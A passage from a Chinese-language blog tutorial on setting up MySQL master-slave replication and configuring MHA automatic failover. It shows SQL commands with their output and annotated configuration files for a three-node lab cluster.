class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; grant replication slave on *.* to slave@&apos;192.168.73.%&apos; identified by &apos;123456&apos;;</span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; change master to master_host=&apos;192.168.73.21&apos;,master_user=&apos;slave&apos;,master_password=&apos;123456&apos;;</span><br><span class="line">Query OK, 0 rows affected, 2 warnings (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show master status;</span><br><span class="line">+<span class="comment">---------------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">| File                | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |</span><br><span class="line">+<span class="comment">---------------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">| mysql-slave1.000002 |      154 | ha           | mysql            |                   |</span><br><span class="line">+<span class="comment">---------------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">slave</span> <span class="keyword">status</span>\G</span><br><span class="line">*************************** <span class="number">1.</span> <span class="keyword">row</span> ***************************</span><br><span class="line">               Slave_IO_State: Waiting <span class="keyword">for</span> <span class="keyword">master</span> <span class="keyword">to</span> send <span class="keyword">event</span></span><br><span class="line">                  Master_Host: <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span></span><br><span class="line">                  Master_User: <span class="keyword">slave</span></span><br><span class="line">                  Master_Port: <span class="number">3306</span></span><br><span class="line">                Connect_Retry: <span class="number">60</span></span><br><span class="line">              Master_Log_File: mysql-<span class="keyword">bin</span>-<span class="keyword">master</span><span class="number">.000002</span></span><br><span class="line">          Read_Master_Log_Pos: <span class="number">154</span></span><br><span class="line">               Relay_Log_File: ctos_sqlsrv-relay-<span class="keyword">bin</span><span class="number">.000011</span></span><br><span class="line">                Relay_Log_Pos: <span class="number">381</span></span><br><span class="line">        Relay_Master_Log_File: mysql-<span class="keyword">bin</span>-<span class="keyword">master</span><span class="number">.000002</span></span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB:</span><br><span class="line">.................................................&#x7701;&#x7565;.......................................................</span><br><span class="line">                  Master_UUID: <span class="number">8</span>f5a42da-cd2d<span class="number">-11</span>ec<span class="number">-8</span>c02<span class="number">-000</span>c29f9275c</span><br><span class="line">             Master_Info_File: /<span class="keyword">var</span>/lib/mysql/master.info</span><br><span class="line">                    SQL_Delay: <span class="number">0</span></span><br><span class="line">          SQL_Remaining_Delay: <span class="literal">NULL</span></span><br><span class="line">      Slave_SQL_Running_State: <span class="keyword">Slave</span> has <span class="keyword">read</span> all relay <span class="keyword">log</span>; waiting for more updates</span><br><span class="line">           Master_Retry_Count: 86400</span><br><span class="line">.................................................&#x7701;&#x7565;........................................................</span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x5728;192-168-73-23&#x4E0A;&#x914D;&#x7F6E;MySQL-slave"><a href="#&#x5728;192-168-73-23&#x4E0A;&#x914D;&#x7F6E;MySQL-slave" class="headerlink" title="&#x5728;192.168.73.23&#x4E0A;&#x914D;&#x7F6E;MySQL slave"></a>&#x5728;192.168.73.23&#x4E0A;&#x914D;&#x7F6E;MySQL slave</h3><p><strong>&#x914D;&#x7F6E;<code>my.cnf</code>&#xFF0C;&#x6DFB;&#x52A0;&#x9700;&#x8981;&#x7684;&#x53C2;&#x6570;&#xFF1A;</strong><br></p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">bind-address</span>    = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">log-bin</span>=mysql-slave2</span><br><span class="line"><span class="attr">server-id</span>=<span class="number">3</span></span><br><span class="line"><span class="attr">binlog-do-db</span>=ha</span><br><span class="line"><span class="attr">binlog-ignore-db</span>=mysql</span><br><span class="line"><span class="attr">log_slave_updates</span>=<span class="number">1</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x91CD;&#x542F;MySQL</p><p><strong>&#x6388;&#x6743;&#x5E76;&#x5EFA;&#x7ACB;&#x4E3B;&#x4ECE;&#x5173;&#x7CFB;</strong><br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">master</span> <span class="keyword">status</span>;</span><br><span class="line">+<span class="comment">---------------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">| File                | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |</span><br><span class="line">+<span class="comment">---------------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">| mysql-slave2.000002 |      601 | ha           | mysql            |                   |</span><br><span class="line">+<span class="comment">---------------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">change</span> <span class="keyword">master</span> <span class="keyword">to</span> master_host=<span class="string">&apos;192.168.73.21&apos;</span>,master_user=<span class="string">&apos;slave&apos;</span>,master_password=<span class="string">&apos;123456&apos;</span>;</span><br><span class="line">Query OK, 0 rows affected, 2 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; start slave;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show slave status\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting for master to send event</span><br><span class="line">                  Master_Host: 192.168.73.21</span><br><span class="line">                  Master_User: slave</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-bin-master.000002</span><br><span class="line">          Read_Master_Log_Pos: 154</span><br><span class="line">               Relay_Log_File: rhel_sqlsrv-relay-bin.000003</span><br><span class="line">                Relay_Log_Pos: 381</span><br><span class="line">        Relay_Master_Log_File: mysql-bin-master.000002</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">.................................................&#x7701;&#x7565;.......................................................</span><br><span class="line">             Master_Server_Id: 1</span><br><span class="line">                  Master_UUID: 8f5a42da-cd2d-11ec-8c02-000c29f9275c</span><br><span class="line">             Master_Info_File: /var/lib/mysql/master.info</span><br><span class="line">                    SQL_Delay: 0</span><br><span class="line">          SQL_Remaining_Delay: NULL</span><br><span class="line">      Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates</span><br><span class="line">           Master_Retry_Count: 86400</span><br><span class="line">.................................................&#x7701;&#x7565;.......................................................</span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x4E24;&#x53F0;slave&#x670D;&#x52A1;&#x5668;&#x8BBE;&#x7F6E;read_only&#xFF08;&#x4ECE;&#x5E93;&#x5BF9;&#x5916;&#x63D0;&#x4F9B;&#x8BFB;&#x670D;&#x52A1;&#xFF0C;&#x53EA;&#x6240;&#x4EE5;&#x6CA1;&#x6709;&#x5199;&#x8FDB;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x662F;&#x56E0;&#x4E3A;slave&#x968F;&#x65F6;&#x4F1A;&#x63D0;&#x5347;&#x4E3A;master&#xFF09;</strong></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set global read_only=1;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x521B;&#x5EFA;&#x76D1;&#x63A7;&#x7528;&#x6237;&#xFF08;&#x5728;&#x4E3B;&#x4ECE;&#x4E0A;&#x90FD;&#x6267;&#x884C;&#xFF09;&#xFF1A;</strong><br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> <span class="string">&apos;root&apos;</span>@<span class="string">&apos;192.168.10.%&apos;</span> <span class="keyword">identified</span>&#xA0; <span class="keyword">by</span> <span class="string">&apos;123456&apos;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5230;&#x8FD9;&#x91CC;&#x6574;&#x4E2A;&#x96C6;&#x7FA4;&#x73AF;&#x5883;&#x5DF2;&#x7ECF;&#x642D;&#x5EFA;&#x5B8C;&#x6BD5;&#xFF0C;&#x5269;&#x4E0B;&#x7684;&#x5C31;&#x662F;&#x914D;&#x7F6E;MHA&#x8F6F;&#x4EF6;&#x4E86;</p><h2 id="3-&#x914D;&#x7F6E;MHA"><a href="#3-&#x914D;&#x7F6E;MHA" class="headerlink" title="3. &#x914D;&#x7F6E;MHA"></a>3. &#x914D;&#x7F6E;MHA</h2><p><strong>&#xFF08;1&#xFF09;&#x521B;&#x5EFA;MHA&#x7684;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x4E14;&#x521B;&#x5EFA;&#x76F8;&#x5173;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF08;&#x5728;&#x8F6F;&#x4EF6;&#x5305;&#x89E3;&#x538B;&#x540E;&#x7684;&#x76EE;&#x5F55;&#x91CC;&#x9762;&#x6709;&#x6837;&#x4F8B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF09;</strong></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; mkdir -p /etc/masterha</span><br><span class="line">[root@ctos7mini ~]&amp; mkdir -p /var/log/masterha/app1</span><br><span class="line">[root@ctos7mini ~]&amp; vim /etc/masterha/app1.cnf</span><br></pre></td></tr></tbody></table></figure><p>&#x4FEE;&#x6539;app1.cnf&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF08;&#x6CE8;&#x610F;&#xFF0C;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x6CE8;&#x91CA;&#x9700;&#x8981;&#x53BB;&#x6389;&#xFF0C;&#x6211;&#x8FD9;&#x91CC;&#x662F;&#x4E3A;&#x4E86;&#x89E3;&#x91CA;&#x6E05;&#x695A;&#xFF09;&#xFF1A;</p><p><strong>&#x53C2;&#x6570;&#x8BF4;&#x660E;</strong><br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[server <span class="keyword">default</span>]</span><br><span class="line">manager_workdir=/var/<span class="built_in">log</span>/masterha/app1&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="comment">//&#x8BBE;&#x7F6E;manager&#x7684;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;</span></span><br><span class="line">manager_log=/var/<span class="built_in">log</span>/masterha/app1/manager.<span class="built_in">log</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; <span class="comment">//&#x8BBE;&#x7F6E;manager&#x7684;&#x65E5;&#x5FD7;</span></span><br><span class="line">master_binlog_dir=/data/mysql&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; <span class="comment">//&#x8BBE;&#x7F6E;master &#x4FDD;&#x5B58;binlog&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x4EE5;&#x4FBF;MHA&#x53EF;&#x4EE5;&#x627E;&#x5230;master&#x7684;&#x65E5;&#x5FD7;&#xFF0C;&#x6211;&#x8FD9;&#x91CC;&#x7684;&#x4E5F;&#x5C31;&#x662F;mysql&#x7684;&#x6570;&#x636E;&#x76EE;&#x5F55;</span></span><br><span class="line">master_ip_failover_script= /usr/local/bin/master_ip_failover&#xA0;&#xA0;&#xA0; <span class="comment">//&#x8BBE;&#x7F6E;&#x81EA;&#x52A8;failover&#x65F6;&#x5019;&#x7684;&#x5207;&#x6362;&#x811A;&#x672C;</span></span><br><span class="line">master_ip_online_change_script= /usr/local/bin/master_ip_online_change&#xA0; <span class="comment">//&#x8BBE;&#x7F6E;&#x624B;&#x52A8;&#x5207;&#x6362;&#x65F6;&#x5019;&#x7684;&#x5207;&#x6362;&#x811A;&#x672C;</span></span><br><span class="line">password=<span class="number">123456</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; <span class="comment">//&#x8BBE;&#x7F6E;mysql&#x4E2D;root&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x8FD9;&#x4E2A;&#x5BC6;&#x7801;&#x662F;&#x524D;&#x6587;&#x4E2D;&#x521B;&#x5EFA;&#x76D1;&#x63A7;&#x7528;&#x6237;&#x7684;&#x90A3;&#x4E2A;&#x5BC6;&#x7801;</span></span><br><span class="line">user=root&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#x8BBE;&#x7F6E;&#x76D1;&#x63A7;&#x7528;&#x6237;root</span><br><span class="line">ping_interval=<span class="number">1</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; <span class="comment">//&#x8BBE;&#x7F6E;&#x76D1;&#x63A7;&#x4E3B;&#x5E93;&#xFF0C;&#x53D1;&#x9001;ping&#x5305;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;3&#x79D2;&#xFF0C;&#x5C1D;&#x8BD5;&#x4E09;&#x6B21;&#x6CA1;&#x6709;&#x56DE;&#x5E94;&#x7684;&#x65F6;&#x5019;&#x81EA;&#x52A8;&#x8FDB;&#x884C;railover</span></span><br><span class="line">remote_workdir=/tmp&#xA0;&#xA0;&#xA0;&#xA0; <span class="comment">//&#x8BBE;&#x7F6E;&#x8FDC;&#x7AEF;mysql&#x5728;&#x53D1;&#x751F;&#x5207;&#x6362;&#x65F6;binlog&#x7684;&#x4FDD;&#x5B58;&#x4F4D;&#x7F6E;</span></span><br><span class="line">repl_password=<span class="number">123456</span>&#xA0;&#xA0;&#xA0; <span class="comment">//&#x8BBE;&#x7F6E;&#x590D;&#x5236;&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;</span></span><br><span class="line">repl_user=repl&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; <span class="comment">//&#x8BBE;&#x7F6E;&#x590D;&#x5236;&#x73AF;&#x5883;&#x4E2D;&#x7684;&#x590D;&#x5236;&#x7528;&#x6237;&#x540D;</span></span><br><span class="line">report_script=/usr/local/send_report&#xA0;&#xA0;&#xA0; <span class="comment">//&#x8BBE;&#x7F6E;&#x53D1;&#x751F;&#x5207;&#x6362;&#x540E;&#x53D1;&#x9001;&#x7684;&#x62A5;&#x8B66;&#x7684;&#x811A;&#x672C;</span></span><br><span class="line">shutdown_script=<span class="string">&quot;&quot;</span>&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; <span class="comment">//&#x8BBE;&#x7F6E;&#x6545;&#x969C;&#x53D1;&#x751F;&#x540E;&#x5173;&#x95ED;&#x6545;&#x969C;&#x4E3B;&#x673A;&#x811A;&#x672C;&#xFF08;&#x8BE5;&#x811A;&#x672C;&#x7684;&#x4E3B;&#x8981;&#x4F5C;&#x7528;&#x662F;&#x5173;&#x95ED;&#x4E3B;&#x673A;&#x653E;&#x5728;&#x53D1;&#x751F;&#x8111;&#x88C2;,&#x8FD9;&#x91CC;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#xFF09;</span></span><br><span class="line">ssh_user=root&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; <span class="comment">//&#x8BBE;&#x7F6E;ssh&#x7684;&#x767B;&#x5F55;&#x7528;&#x6237;&#x540D;</span></span><br><span class="line"> </span><br><span class="line">[server1]</span><br><span class="line">hostname=<span class="number">192.168</span><span class="number">.10</span><span class="number">.12</span></span><br><span class="line">port=<span class="number">3306</span></span><br><span class="line"> </span><br><span class="line">[server2]</span><br><span class="line">hostname=<span class="number">192.168</span><span class="number">.10</span><span class="number">.13</span></span><br><span class="line">port=<span class="number">3306</span></span><br><span class="line">candidate_master=<span class="number">1</span>&#xA0;&#xA0; #&#x8BBE;&#x7F6E;&#x4E3A;&#x5019;&#x9009;master&#xFF0C;&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x8BE5;&#x53C2;&#x6570;&#x4EE5;&#x540E;&#xFF0C;&#x53D1;&#x751F;&#x4E3B;&#x4ECE;&#x5207;&#x6362;&#x4EE5;&#x540E;&#x5C06;&#x4F1A;&#x5C06;&#x6B64;&#x4ECE;&#x5E93;&#x63D0;&#x5347;&#x4E3A;&#x4E3B;&#x5E93;&#xFF0C;&#x5373;&#x4F7F;&#x8FD9;&#x4E2A;&#x4E3B;&#x5E93;&#x4E0D;&#x662F;&#x96C6;&#x7FA4;&#x4E2D;&#x4E8B;&#x4EF6;&#x6700;&#x65B0;&#x7684;slave</span><br><span class="line">check_repl_delay=<span class="number">0</span>&#xA0;&#xA0; #&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x5982;&#x679C;&#x4E00;&#x4E2A;slave&#x843D;&#x540E;master <span class="number">100</span>M&#x7684;relay logs&#x7684;&#x8BDD;&#xFF0C;MHA&#x5C06;&#x4E0D;&#x4F1A;&#x9009;&#x62E9;&#x8BE5;slave&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x65B0;&#x7684;master&#xFF0C;&#x56E0;&#x4E3A;&#x5BF9;&#x4E8E;&#x8FD9;&#x4E2A;slave&#x7684;&#x6062;&#x590D;&#x9700;&#x8981;&#x82B1;&#x8D39;&#x5F88;&#x957F;&#x65F6;&#x95F4;&#xFF0C;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;check_repl_delay=<span class="number">0</span>,MHA&#x89E6;&#x53D1;&#x5207;&#x6362;&#x5728;&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x65B0;&#x7684;master&#x7684;&#x65F6;&#x5019;&#x5C06;&#x4F1A;&#x5FFD;&#x7565;&#x590D;&#x5236;&#x5EF6;&#x65F6;&#xFF0C;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x5BF9;&#x4E8E;&#x8BBE;&#x7F6E;&#x4E86;candidate_master=<span class="number">1</span>&#x7684;&#x4E3B;&#x673A;&#x975E;&#x5E38;&#x6709;&#x7528;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x5019;&#x9009;&#x4E3B;&#x5728;&#x5207;&#x6362;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E00;&#x5B9A;&#x662F;&#x65B0;&#x7684;master</span><br><span class="line"> </span><br><span class="line">[server3]</span><br><span class="line">hostname=<span class="number">192.168</span><span class="number">.10</span><span class="number">.14</span></span><br><span class="line">port=<span class="number">3306</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x53C2;&#x8003;&#x914D;&#x7F6E;&#xFF1A;</strong><br></p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[server default]</span></span><br><span class="line"><span class="attr">manager_workdir</span>=/var/log/masterha/app1</span><br><span class="line"><span class="attr">manager_log</span>=/var/log/masterha/app1/manager.log</span><br><span class="line"><span class="attr">master_binlog_dir</span>=/var/lib/mysql</span><br><span class="line"><span class="attr">master_ip_failover_script</span>= /usr/local/bin/master_ip_failover</span><br><span class="line"><span class="attr">master_ip_online_change_script</span>= /usr/local/bin/master_ip_online_change&#xA0;</span><br><span class="line"><span class="attr">password</span>=<span class="number">123456</span></span><br><span class="line"><span class="attr">user</span>=root</span><br><span class="line"><span class="attr">ping_interval</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">remote_workdir</span>=/tmp</span><br><span class="line"><span class="attr">repl_password</span>=<span class="number">123456</span></span><br><span class="line"><span class="attr">repl_user</span>=slave</span><br><span class="line"><span class="comment">#report_script=/usr/local/send_report</span></span><br><span class="line"><span class="attr">shutdown_script</span>=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="attr">ssh_user</span>=root</span><br><span class="line"></span><br><span class="line"><span class="section">[server1]</span></span><br><span class="line"><span class="attr">hostname</span>=<span class="number">192.168</span>.<span class="number">73.21</span></span><br><span class="line"><span class="attr">port</span>=<span class="number">3306</span></span><br><span class="line"></span><br><span class="line"><span class="section">[server2]</span></span><br><span class="line"><span class="attr">hostname</span>=<span class="number">192.168</span>.<span class="number">73.22</span></span><br><span class="line"><span class="attr">port</span>=<span class="number">3306</span></span><br><span class="line"><span class="attr">candidate_master</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">check_repl_delay</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="section">[server3]</span></span><br><span class="line"><span class="attr">hostname</span>=<span class="number">192.168</span>.<span class="number">73.23</span></span><br><span class="line"><span class="attr">port</span>=<span class="number">3306</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#xFF08;2&#xFF09;&#x8BBE;&#x7F6E;relay log&#x7684;&#x6E05;&#x9664;&#x65B9;&#x5F0F;&#xFF08;&#x5728;&#x6BCF;&#x4E2A;slave&#x8282;&#x70B9;&#x4E0A;&#xFF09;&#xFF1A;</strong></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set global relay_log_purge=0;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p><span style="color:red">&#x6CE8;&#x610F;&#xFF1A;</span><br>MHA&#x5728;&#x53D1;&#x751F;&#x5207;&#x6362;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x4ECE;&#x5E93;&#x7684;&#x6062;&#x590D;&#x8FC7;&#x7A0B;&#x4E2D;&#x4F9D;&#x8D56;&#x4E8E;relay log&#x7684;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x8981;&#x5C06;relay log&#x7684;&#x81EA;&#x52A8;&#x6E05;&#x9664;&#x8BBE;&#x7F6E;&#x4E3A;OFF&#xFF0C;&#x91C7;&#x7528;&#x624B;&#x52A8;&#x6E05;&#x695A;relay log&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x5728;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;slave&#x4E0A;&#x7684;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x4F1A;&#x5728;SQL&#x7EBF;&#x7A0B;&#x6267;&#x884C;&#x5B8C;&#x6BD5;&#x540E;&#x88AB;&#x81EA;&#x52A8;&#x5220;&#x9664;&#x3002;<strong>&#x4F46;&#x662F;&#x5728;MHA&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x8FD9;&#x4E9B;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x5728;&#x6062;&#x590D;&#x5176;&#x5B83;slave&#x65F6;&#x53EF;&#x80FD;&#x4F1A;&#x88AB;&#x7528;&#x5230;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x7981;&#x7528;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x7684;&#x81EA;&#x52A8;&#x5220;&#x9664;&#x529F;&#x80FD;&#x3002;</strong>&#x5B9A;&#x671F;&#x6E05;&#x695A;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x9700;&#x8981;&#x8003;&#x8651;&#x5230;&#x590D;&#x5236;&#x5EF6;&#x65F6;&#x7684;&#x95EE;&#x9898;&#x3002;&#x5728;ext3&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E0B;&#xFF0C;&#x5220;&#x9664;&#x5927;&#x7684;&#x6587;&#x4EF6;&#x9700;&#x8981;&#x4E00;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;&#x4E25;&#x91CD;&#x7684;&#x590D;&#x5236;&#x5EF6;&#x65F6;&#x3002;&#x4E3A;&#x4